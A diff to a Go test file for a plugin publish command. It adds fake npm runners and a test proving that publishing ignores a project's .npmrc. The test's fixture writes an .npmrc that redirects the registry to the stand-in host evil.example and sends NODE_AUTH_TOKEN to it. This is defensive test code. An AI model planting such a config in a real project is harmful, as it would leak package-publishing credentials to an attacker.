@@ -7,7 +7,9 @@ import (
 	"log"
 	"net/http/httptest"
 	"os"
+	"os/exec"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"testing"
 
@@ -287,17 +289,47 @@ func TestPublish_NPMDryRunPrintsThePackCommands(t *testing.T) {
 	assert.NoDirExists(t, filepath.Join(root, "dist"))
 }
 
+// npmFake answers npm like the real one: `view` finds no such version, `pack`
+// writes the tarball into --pack-destination, `publish` succeeds.
+func npmFake(t *testing.T) *runner.Fake {
+	t.Helper()
+	return &runner.Fake{Handle: func(spec runner.Spec) runner.Result {
+		if len(spec.Argv) < 2 || spec.Argv[0] != "npm" {
+			return runner.Result{Status: runner.StatusOK}
+		}
+		switch spec.Argv[1] {
+		case "view":
+			return runner.Result{Status: runner.StatusExit, ExitCode: 1, Stderr: []byte("npm ERR! code E404")}
+		case "pack":
+			for i, a := range spec.Argv {
+				if a == "--pack-destination" {
+					require.NoError(t, os.WriteFile(filepath.Join(spec.Argv[i+1], npmTarballName(spec.Argv[len(spec.Argv)-1])), []byte("tarball"), 0o600))
+				}
+			}
+		}
+		return runner.Result{Status: runner.StatusOK}
+	}}
+}
+
+// npmTarballName is what npm pack names the tarball of a package directory
+// <dist>/npm/package whose plugin is the dist's single plugin or <dist>/plugins/<name>/npm/package.
+func npmTarballName(pkgDir string) string {
+	parts := strings.Split(filepath.ToSlash(pkgDir), "/")
+	name := "acme"
+	for i, p := range parts {
+		if p == "plugins" && i+1 < len(parts) {
+			name = parts[i+1]
+		}
+	}
+	return "acme-" + name + "-1.4.0.tgz"
+}
+
 func TestPublish_NPMExecuteUsesAFilteredEnvironment(t *testing.T) {
 	publishProject(t)
 	t.Setenv("NODE_AUTH_TOKEN", "token-for-npm-only")
 	t.Setenv("AWS_SECRET_ACCESS_KEY", "must-not-reach-npm")
 	publishTo, publishNPMScope, publishExecute, publishYes, publishChannel = publish.TargetNPM, "@acme", true, true, "canary"
-	fake := &runner.Fake{Handle: func(spec runner.Spec) runner.Result {
-		if len(spec.Argv) > 1 && spec.Argv[0] == "npm" && spec.Argv[1] == "view" {
-			return runner.Result{Status: runner.StatusExit, ExitCode: 1, Stderr: []byte("npm ERR! code E404")}
-		}
-		return runner.Result{Status: runner.StatusOK}
-	}}
+	fake := npmFake(t)
 	publishRunner = fake
 
 	_, err := runPublishCapture(t)
@@ -312,7 +344,7 @@ func TestPublish_NPMExecuteUsesAFilteredEnvironment(t *testing.T) {
 		env := strings.Join(c.Env, "\n")
 		assert.Contains(t, env, "NODE_AUTH_TOKEN=token-for-npm-only")
 		assert.NotContains(t, env, "AWS_SECRET_ACCESS_KEY")
-		assert.True(t, strings.HasSuffix(filepath.ToSlash(c.Dir), "/dist"), c.Dir)
+		assert.NotContains(t, filepath.ToSlash(c.Dir), "/dist", "npm runs from an empty temporary directory, not the dist directory")
 		assert.False(t, c.InheritEnv)
 	}
 	assert.Equal(t, [][]string{{"npm", "view"}, {"npm", "pack"}, {"npm", "publish"}}, npmCalls)
@@ -320,6 +352,61 @@ func TestPublish_NPMExecuteUsesAFilteredEnvironment(t *testing.T) {
 		assert.NotContains(t, content, "token-for-npm-only", name)
 	}
 	assert.Contains(t, readDist(t, publishDist)["publish-plan.json"], `"tag": "canary"`)
+}
+
+// fakeNPMOnPath puts an npm script first on PATH and proves it is the npm that
+// resolves, so a test can never reach a real registry. It logs argv and the
+// working directory of every call.
+func fakeNPMOnPath(t *testing.T) string {
+	t.Helper()
+	if runtime.GOOS == "windows" {
+		t.Skip("shell stub")
+	}
+	dir := t.TempDir()
+	script := `#!/bin/sh
+d=$(dirname "$0")
+echo "$@" >> "$d/npm.log"
+pwd >> "$d/npm.cwd"
+case "$1" in
+  view) echo "npm ERR! code E404" >&2; exit 1;;
+  pack)
+    while [ $# -gt 0 ]; do
+      if [ "$1" = "--pack-destination" ]; then dest="$2"; fi
+      shift
+    done
+    printf tarball > "$dest/acme-acme-1.4.0.tgz";;
+esac
+exit 0
+`
+	require.NoError(t, os.WriteFile(filepath.Join(dir, "npm"), []byte(script), 0o755)) //nolint:gosec // test stub
+	t.Setenv("PATH", dir+string(os.PathListSeparator)+os.Getenv("PATH"))
+	resolved, err := exec.LookPath("npm")
+	require.NoError(t, err)
+	require.Equal(t, filepath.Join(dir, "npm"), resolved, "the fake npm must be the one that resolves")
+	return dir
+}
+
+func TestPublish_NPMExecuteIgnoresAProjectNpmrc(t *testing.T) {
+	root := publishProject(t)
+	fake := fakeNPMOnPath(t)
+	writeFile(t, filepath.Join(root, ".npmrc"), "registry=https://evil.example/\n//evil.example/:_authToken=${NODE_AUTH_TOKEN}\n")
+	publishGit(t, root, "add", "-A")
+	publishGit(t, root, "commit", "-q", "-m", "npmrc")
+	t.Setenv("NODE_AUTH_TOKEN", "token-for-npm-only")
+	publishTo, publishNPMScope, publishExecute, publishYes = publish.TargetNPM, "@acme", true, true
+
+	out, err := runPublishCapture(t)
+
+	require.NoError(t, err)
+	assert.Contains(t, out, "registry    https://registry.npmjs.org/", "the plan names the effective registry, not the project's")
+	cwds, _ := os.ReadFile(filepath.Join(fake, "npm.cwd")) //nolint:errcheck // asserted below
+	rootResolved, _ := filepath.EvalSymlinks(root)         //nolint:errcheck // a temp dir
+	for _, cwd := range strings.Fields(string(cwds)) {
+		assert.NotContains(t, cwd, rootResolved, "npm must not run inside the project")
+	}
+	logged, _ := os.ReadFile(filepath.Join(fake, "npm.log")) //nolint:errcheck // asserted below
+	assert.Equal(t, 3, strings.Count(string(logged), "--userconfig"))
+	assert.Equal(t, 3, strings.Count(string(logged), "--globalconfig"))
 }
 
 func TestPublish_NPMNeedsAScope(t *testing.T) {
@@ -628,12 +715,7 @@ func TestPublish_OnlyNeedsAMultiPluginProject(t *testing.T) {
 func TestPublish_MultiPluginExecutesEachPluginsTarget(t *testing.T) {
 	multiProject(t)
 	publishTo, publishNPMScope, publishExecute, publishYes = publish.TargetNPM, "@acme", true, true
-	fake := &runner.Fake{Handle: func(spec runner.Spec) runner.Result {
-		if spec.Argv[0] == "npm" && spec.Argv[1] == "view" {
-			return runner.Result{Status: runner.StatusExit, ExitCode: 1, Stderr: []byte("E404")}
-		}
-		return runner.Result{Status: runner.StatusOK}
-	}}
+	fake := npmFake(t)
 	publishRunner = fake
 
 	_, err := runPublishCapture(t)
@@ -642,7 +724,7 @@ func TestPublish_MultiPluginExecutesEachPluginsTarget(t *testing.T) {
 	var published []string
 	for _, c := range fake.Calls() {
 		if c.Argv[0] == "npm" && c.Argv[1] == "publish" {
-			published = append(published, strings.TrimPrefix(c.Argv[2], "./"))
+			published = append(published, "npm/"+filepath.Base(c.Argv[2]))
 		}
 	}
 	assert.Equal(t, []string{"npm/acme-acme-alpha-1.4.0.tgz", "npm/acme-acme-beta-1.4.0.tgz"}, published)
